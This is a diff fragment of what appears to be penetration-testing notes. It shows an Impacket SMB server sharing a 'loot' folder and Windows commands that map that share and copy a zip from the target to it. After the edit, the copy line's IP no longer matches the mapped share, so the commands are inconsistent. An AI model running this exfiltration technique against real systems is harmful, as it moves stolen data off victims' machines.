@@ -165,7 +165,7 @@ sudo impacket-smbserver share /tmp/loot -smb2support \
     
 
 # window
-net use \\172.16.8.120\share /user:x x
+net use \\172.16.8.12\share /user:x x
 copy C:\temp\20261010100351_inlane.zip \\172.16.8.120\share\
 ```
 
